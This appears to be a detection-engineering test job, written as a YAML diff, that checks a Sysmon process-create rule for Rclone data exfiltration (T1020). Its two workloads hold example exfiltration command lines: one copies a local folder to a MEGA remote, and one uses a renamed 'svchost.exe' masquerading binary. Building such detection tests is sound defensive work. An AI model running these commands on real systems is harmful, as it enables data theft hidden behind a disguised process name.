@@ -1,0 +1,51 @@
+type: job
+description: |
+  Validates detection of Rclone data-exfiltration command-line usage via Sysmon EID 1
+  process-create events (T1020). Covers a genuine rclone.exe copy of a local folder to a
+  remote mega backend and a renamed-binary masquerade (svchost.exe whose PE
+  OriginalFileName stays rclone.exe) carrying copy and transfer-tuning flags, confirming
+  the Endpoint.Processes command-line detection fires on both the process_name and the
+  original_file_name match paths.
+tags: [rclone]
+mitre:
+  tactics: [exfiltration]
+  techniques: [T1020]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  username:            gen.username()
+  user:                "${ref.domain_short}\\${ref.username}"
+  tool_dir:            "C:\\Users\\${ref.username}\\Downloads\\rclone-v1.55.1-windows-amd64"
+  rclone_image:        "${ref.tool_dir}\\rclone.exe"
+  renamed_image:       "${ref.tool_dir}\\svchost.exe"
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/rclone-command-line-usage
+    bindings:
+      domain_short:  ref.domain_short
+      domain_tld:    ref.domain_tld
+      computer:      ref.computer
+      username:      ref.username
+      user:          ref.user
+      image:         ref.rclone_image
+      command_line:  "${ref.rclone_image}  --progress copy c:\\temp mega:backup"
+    expectation:
+      expected: alert
+      summary: "rclone.exe --progress copy to a remote mega backend fires the data-transfer command-line detection"
+
+  - scenario: scenarios/windows/sysmon/process-create/rclone-command-line-usage
+    bindings:
+      domain_short:  ref.domain_short
+      domain_tld:    ref.domain_tld
+      computer:      ref.computer
+      username:      ref.username
+      user:          ref.user
+      image:         ref.renamed_image
+      command_line:  "${ref.renamed_image}  copy c:\\temp mega:backup -q --ignore-existing --auto-confirm --multi-thread-streams --transfers 12"
+    expectation:
+      expected: alert
+      summary: "Renamed rclone binary (svchost.exe, OriginalFileName rclone.exe) with copy and transfer flags fires via the original_file_name match path"
